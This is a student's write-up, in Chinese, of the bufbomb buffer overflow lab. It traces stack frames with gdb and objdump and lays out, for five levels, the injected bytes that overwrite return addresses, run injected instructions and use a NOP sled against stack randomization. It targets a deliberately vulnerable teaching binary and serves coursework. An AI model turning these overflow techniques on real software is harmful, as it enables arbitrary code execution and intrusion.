## 计算机网络体系结构&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈运算实验&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;说明文档

<p style="text-align: right;">软件41 马子俊 2014013408</p>

----

#### 说明：

我的 cookie 是 0x6078ec11

实现本实验要求的5个缓冲区溢出攻击的关键都在于——摸清test函数在调用getbuf函数时，栈帧的具体存储情况

通过命令 `objdump -d bufbomb > bufbomb.S`, 我们可以得到可执行文件 `bufbomb` 的汇编代码 `bufbomb.S`。

这里列出汇编代码中 `test`，`getbuf`, `Gets` 三个函数片段，以备后续的参考。

函数片段中的汇编代码的地址是有可能随机器的变化而变化的。

`test`代码片段如下:

| Address | Machine Code | Assembly Code |
|:---:|:---:|:---:|
| 08048be0 | 55 | push   %ebp |
| 08048be1 | 89 e5  | mov    %esp,%ebp |
| 08048be3 | 83 ec 28 | sub    $0x28,%esp |
| 08048be6 | e8 38 04 00 00 | call   8049023 &lt;uniqueval&gt; |
| 08048beb | 89 45 f0  | mov    %eax,-0x10(%ebp) |
| 08048bee | e8 91 06 00 00 | call   8049284 &lt;getbuf&gt; |
| 08048bf3 | 89 45 f4  | mov    %eax,-0xc(%ebp) |

`getbuf`代码片段如下:

| Address | Machine Code | Assembly Code |
|:---:|:---:|:---:|
| 08049284 | 55 | push   %ebp |
| 08049285 | 89 e5  | mov    %esp,%ebp |
| 08049287 | 83 ec 38 | sub    $0x38,%esp |
| 0804928a | 8d 45 d8 | lea    -0x28(%ebp),%eax |
| 0804928d | 89 04 24 | mov    %eax,(%esp) |
| 08049290 | e8 d1 fa ff ff | call   8048d66 &lt;Gets&gt; |
| 08049295 | b8 01 00 00 00  | mov    $0x1,%eax |
| 0804929a | c9  | leave |
| 0804929b | c3  | ret |

通过 `gdb` 对 `bufbomb` 栈帧状况进行跟踪，结合自己储备的栈帧知识，对 `test` 函数在调用 `getbuf` 函数时的栈帧状况作如下说明：

当 `getbuf` 函数即将调用 `Gets` 函数时，`getbuf` 栈帧状况如下：


| 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | 0x556830fb ~ 0x556830f8 | 4 | test 栈帧 |
| 08 04 8b f3 | 0x556830f7 ~ 0x556830f4 | 4 | 返回地址 |
| 55 68 31 20 | 0x556830f3 ~ 0x556830f0 | 4 | %ebp 旧值，当前 %ebp指向此处 |
| XX .... XX  | 0x556830ef ~ 0x556830e8 | 8 | 正常情况下不利用的区域 |
| XX .... XX  | 0x556830e7 ~ 0x556830c8 | 32 | 正常情况下作为缓冲区 |
| XX .... XX  | 0x556830c7 ~ 0x556830bc | 12 |                |
| 55 68 30 c8 | 0x556830bb ~ 0x556830b8 | 4 | 存储的值为缓冲区起始地址，当前 %esp指向此处 |


当 `getbuf` 函数调用 `Gets` 函数时，假使我们传入的字符串是 `01234567`，那么当控制权从 `Gets` 返回至 `getbuf` 时，getbuf栈帧状况如下：

| 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | 0x556830fb ~ 0x556830f8 | 4 | test 栈帧 |
| 08 04 8b f3 | 0x556830f7 ~ 0x556830f4 | 4 | 返回地址 |
| 55 68 31 20 | 0x556830f3 ~ 0x556830f0 | 4 | %ebp 旧值，当前 %ebp指向此处 |
| XX .... XX  | 0x556830ef ~ 0x556830e8 | 8 | 正常情况下不利用的区域 |
| XX .... 00  | 0x556830e7 ~ 0x556830d0 | 24 | 未利用的缓冲区(注意包含终止符 '\0' ) |
| 37 36 35 34 | 0x556830cf ~ 0x556830cc | 4 | 已利用的缓冲区('7654') |
| 33 32 31 30 | 0x556830cb ~ 0x556830c8 | 4 | 已利用的缓冲区('3210') |
| XX .... XX  | 0x556830c7 ~ 0x556830bc | 12 |                |
| 55 68 30 c8 | 0x556830bb ~ 0x556830b8 | 4 | 存储的值为缓冲区起始地址，当前 %esp指向此处 |

当 `getbuf`执行完 leave 语句时，栈帧状况如下：

| 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | 0x556830fb ~ 0x556830f8 | 4 | test 栈帧 |
| 08 04 8b f3 | 0x556830f7 ~ 0x556830f4 | 4 | 返回地址，当前 %esp 指向此处 |
| 55 68 31 20 | 0x556830f3 ~ 0x556830f0 | 4 | %ebp 旧值 |
| XX .... XX  | 0x556830ef ~ 0x556830e8 | 8 | 正常情况下不利用的区域 |
| XX .... 00  | 0x556830e7 ~ 0x556830d0 | 24 | 未利用的缓冲区(注意包含终止符 '\0' ) |
| 37 36 35 34 | 0x556830cf ~ 0x556830cc | 4 | 已利用的缓冲区('7654') |
| 33 32 31 30 | 0x556830cb ~ 0x556830c8 | 4 | 已利用的缓冲区('3210') |
| XX .... XX  | 0x556830c7 ~ 0x556830bc | 12 |                |
| 55 68 30 c8 | 0x556830bb ~ 0x556830b8 | 4 | 存储的值为缓冲区起始地址|

注意到执行完 leave 语句后，esp 指向的存储单元发生了改变，指向了返回地址。此时 %ebp 也恢复了旧值。不再指向当前栈帧。

当 getbuf 执行完 ret 语句后， 栈帧状况如下：

| 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | 0x556830fb ~ 0x556830f8 | 4 | test 栈帧，当前 %esp 指向此处 |
| 08 04 8b f3 | 0x556830f7 ~ 0x556830f4 | 4 | 返回地址 |
| 55 68 31 20 | 0x556830f3 ~ 0x556830f0 | 4 | %ebp 旧值 |
| XX .... XX  | 0x556830ef ~ 0x556830e8 | 8 | 正常情况下不利用的区域 |
| XX .... 00  | 0x556830e7 ~ 0x556830d0 | 24 | 未利用的缓冲区(注意包含终止符 '\0' ) |
| 37 36 35 34 | 0x556830cf ~ 0x556830cc | 4 | 已利用的缓冲区('7654') |
| 33 32 31 30 | 0x556830cb ~ 0x556830c8 | 4 | 已利用的缓冲区('3210') |
| XX .... XX  | 0x556830c7 ~ 0x556830bc | 12 |                |
| 55 68 30 c8 | 0x556830bb ~ 0x556830b8 | 4 | 存储的值为缓冲区起始地址|

注意到 %esp指向的存储单元再次发生变化，程序将继续执行 0x08048bf3 处的代码。

----

### Level 0:

Level 0 需要利用缓冲区溢出来更改先前说明的返回地址，使程序在退出 getbuf 后，执行 smoke 函数。我们按照如下方式构造待注入存储单元的16进制数：

	1. 注入 (32 + 8 + 4) 个 ‘00’, 填充缓冲区和不利用的区域，覆盖 %ebp 旧值

	2. smoke 首语句的地址是 0x08048b04, 所以再依次注入 04 8b 04 08， 从而更新返回地址为 0x08048b04。


---

### Level 1:

Level 0 需要更改返回地址，使程序转而执行 fizz 函数，并且设法使 fizz 的参数 val 等于 cookie。

修改返回地址比较容易，但我们需要考察 fizz 的参数 val 处于栈帧的何处。

fizz 的汇编代码片段如下:

| Address | Machine Code | Assembly Code |
|:---:|:---:|:---:|
| 08048b2e | 55 | push   %ebp |
| 08048b2f | 89 e5  | mov    %esp,%ebp |
| 08048b31 | 83 ec 18 | sub    $0x18,%esp |
| 08048b34 | 8b 55 08 | lea    0x8(%ebp),%edx |
| 08048b37 | a1 04 e1 04 08 | mov    0x804e104, %eax |
| 08048b3c | 39 c2 | cmp   %eax, %edx |

通过上述汇编代码片段知，cookie存储在起始地址为 0x804e104 的存储单元中，而 0x8(%ebp) 就应该是参数 val 的起始地址。

当程序执行至地址为 0x08048b3c 处的语句时，栈帧结构如下：

| 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | 0x556830fb ~ 0x556830f8 | 4 | test 栈帧 |
| 55 68 31 20 | 0x556830f7 ~ 0x556830f4 | 4 | %ebp 旧值，当前 %ebp指向此处 |
| XXX...XXX | 0x556830f3 ~ 0x556830dc | 24 | 当前 %esp 指向此处 |

所以 参数 val 的起始地址应为 0x556830fc。

我们按照如下方式构造待注入存储单元的16进制数：

	1. 注入 (32 + 8 + 4)个 '00', 在依次注入 2e, 8b, 04, 08， 从而更新返回地址为 0x08048b2e;

	2. 注入 4个 ‘00’，覆盖 0x556830f4 ~ 0x556830f7 的内容

	3. 依次注入 11 ec 78 60, 从而使得 val 的值变为 cookie

----

### Level 2:

本阶段我们需要更改返回地址，使得程序在从 getbuf 返回后, 继续执行栈上的代码，栈上的代码需要修改 global_value 的值为 cookie 并且提供新的返回地址，

使得栈上的代码执行完毕后，程序继续执行 bang函数 的首语句。

bang 的汇编代码片段如下:

| Address | Machine Code | Assembly Code |
|:---:|:---:|:---:|
| 08048b82 | 55 | push   %ebp |
| 08048b83 | 89 e5  | mov    %esp,%ebp |
| 08048b85 | 83 ec 18 | sub    $0x18,%esp |
| 08048b88 | a1 0c e1 04 08 | mov    0x804e10c, %eax |
| 08048b8d | 89 c2 | mov    %eax, %edx |
| 08048b8f | a1 04 e1 04 08 | mov    0x804e104, %eax |
| 08048b94 | 39 c2 | cmp   %eax, %edx |


通过上述汇编代码片段知，global_value 存储在起始地址为 0x804e10c 的存储单元中。


假设我们修改 getbuf 的返回地址为 0x556830c8(缓冲区的首地址), 而我们注入的可执行代码也从此处开始。

当 getbuf 执行完 ret 语句之后，栈结构如下：

 | 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | 0x556830fb ~ 0x556830f8 | 4 | test 栈帧，当前 %esp指向此处 |
| 55 68 30 c8 | 0x556830f7 ~ 0x556830f4 | 4 | 返回地址 |
| XXX...XXX | 0x556830f3 ~ 0x556830c8 | 44 | 当前 pc 指向此处 |

那么我们注入的可执行代码如下:

> movl $0x6078ec11, 0x0804e10c  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /\* 修改 global_value 的值是 cookie \*/

> pushl $0x08048b82     &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       /\* 向栈顶添加新的返回地址 \*/

> ret &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  /\* 使得程序跳至 bang 的首语句执行 \*/ 


综上，我们向缓冲区中注入如下16进制代码 ：

	1. 注入可执行代码对应的机器码

	2. 注入若干‘00’，覆盖至地址为 0x556830f3 的存储单元

	3. 依次注入c8 30 68 55, 使得返回地址更新为 0x556830c8

----

### Level 3:

本阶段实验与Level 2很像，我们同样修改 getbuf 的返回地址为 0x556830c8(缓冲区的首地址), 而我们注入的可执行代码也从此处开始。

那么我们注入的可执行代码如下:

> movl $0x6078ec11, %eax  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /\* 将 cookie 存入 %eax， 则 cookie 将作为 getbuf 新的返回值\*/

> pushl $0x08048bf3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /\* 向栈顶添加新的返回地址 \*/

> ret &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  /\* 使得程序跳至 test 的下一条语句执行 \*/

同时还要注意一点，本阶段试验要求程序最终还是返回 test 继续执行，如果我们在进行缓冲区溢出攻击时，破坏了 %ebp 的旧值，那么当程序返回test时，会出现段错误。故在进行缓冲区溢出攻击时，应该在 %ebp 旧值的存储单元中进行等值覆盖。


注意到此时 bufbomb 尚未进行栈随机化，%ebp 旧值是固定的，我的 %ebp 旧值为 0x55683120。


综上，我们向缓冲区中注入如下16进制代码 ：

	1. 注入可执行代码对应的机器码

	2. 注入若干‘00’，覆盖至地址为 0x556830ef 的存储单元

	3. 依次注入20 31 68 55,  对 %ebp 旧值的存储单元 (0x556830f3 ~ 0x556830f0) 进行等值覆盖

	4. 依次注入c8 30 68 55, 使得返回地址更新为 0x556830c8

----

### Level 4:

考虑栈帧起始地址在一定范围内随机，完成与 Level 3 相同的攻击任务

这里先列出本实验涉及的 `testn` 和 `getbufn` 的汇编代码片段

`testn` 汇编代码片段:

| Address | Machine Code | Assembly Code |
|:---:|:---:|:---:|
| 08048c54 | 55 | push   %ebp |
| 08048c55 | 89 e5  | mov    %esp,%ebp |
| 08048c57 | 83 ec 28 | sub    $0x28,%esp |
| 08048c5a | e8 38 03 00 00 | call   8049023 &lt;uniqueval&gt; |
| 08048c5f | 89 45 f0  | mov    %eax,-0x10(%ebp) |
| 08048c62 | e8 35 06 00 00 | call   804929c &lt;getbufn&gt; |
| 08048c67 | 89 45 f4  | mov    %eax,-0xc(%ebp) |

`getbufn` 汇编代码片段:

| Address | Machine Code | Assembly Code |
|:---:|:---:|:---:|
| 0804929c | 55 | push   %ebp |
| 0804929d | 89 e5  | mov    %esp,%ebp |
| 0804929f | 81 ec 18 02 00 00 | sub    $0x218,%esp |
| 080492a5 | 8d 85 f8 fd ff ff | lea    -0x208(%ebp),%eax |
| 080492ab | 89 04 24 | mov    %eax,(%esp) |
| 080492ae | e8 d1 fa ff ff | call   8048d66 &lt;Gets&gt; |
| 080492b3 | b8 01 00 00 00  | mov    $0x1,%eax |
| 080492b8 | c9  | leave |
| 080492b9 | c3  | ret |


当getbufn即将调用 Gets 时，栈帧结构如下:


| 存储块 | 地址 | 字节数 | 备注  |
|:---:|:----:|:----:|:---:|
| XX XX XX XX | address + 11 ~ address + 8 | 4 | test 栈帧 |
| 08 04 8c 67 | address + 7 ~ address + 4 | 4 | 返回地址 |
| address + 0x30 | address + 3 ~ address | 4 | %ebp 旧值，当前 %ebp指向此处 |
| XX .... XX  | address - 1 ~ address - 8 | 8 | 正常情况下不利用的区域 |
| XX .... XX  | address - 9 ~ address - 520 | 512 | 正常情况下作为缓冲区 |
| XX .... XX  | address - 521 ~ address - 532 | 12 |                |
| address - 520 | address - 533 ~ address - 536 | 4 | 存储的值为缓冲区起始地址，当前 %esp指向此处 |


问题1： 由于栈随机化，%ebp 旧值是不固定的，如何保证缓冲区溢出攻击不会破坏 %ebp 的值 ？

    * 显然通过对 %ebp 旧值的存储单元进行等值覆盖是不现实的，只有通过攻击代码将被破坏的 %ebp 还原。

    * 通过 gdb 对此栈帧结构的多次跟踪，发现 %ebp 旧值和新值之间存在 0x30 的恒定差值。

    * 考虑到攻击代码被执行时，%esp 存储的值为 address + 8（即 address + 0x8), 故我们可以通过如下语句实现 %ebp 的还原：

      leal 0x28(%esp), %ebp


参考 Level 3, 设计核心攻击代码如下：

> leal 0x28(%esp), %ebp

> movl $0x6078ec11, %eax

> push $0x08048c67

> ret


问题2：我们一共要向缓冲区注入528个字节，这样最后的4个字节可以更新 getbufn 的返回地址，从而执行我们注入的代码。可是返回地址应该被更新为多少？

    我用 gdb 考察了缓冲区的起始地址，结果显示缓冲区的起始地址在 0x55682e68 ~ 0x55682f58 之间，最大值和最小值只之差为 240。 

    实验指导说明里有提到，如果对 getbufn 连续执行两次时的 %ebp 进行采样，会发现差值有可能达到 +/- 240，这实际上就是说缓冲区起始地址的差值在 +/- 240 之间

    所以在栈随机化的情况下，缓冲区的起始地址最小为 0x55682e68， 最大为 0x55682f58

    考虑把返回地址更新为 0x55682f58, 并先向缓冲区注入尽可能多的 nop，再注入核心攻击代码，新的返回地址。

    这样的好处是，不论某次运行 getbufn 时缓冲区的起始地址如何，程序总可以通过运行一些 nop 指令后，开始运行我们的核心攻击代码。


综上，设计需要注入缓冲区的528个字节如下：

	1. 注入尽可能多的 '90'(nop);

	2. 注入核心攻击代码对应的机器码

	3. 依次注入 58 2f 68 55, 更新 getbufn 返回地址为 0x55682f58

 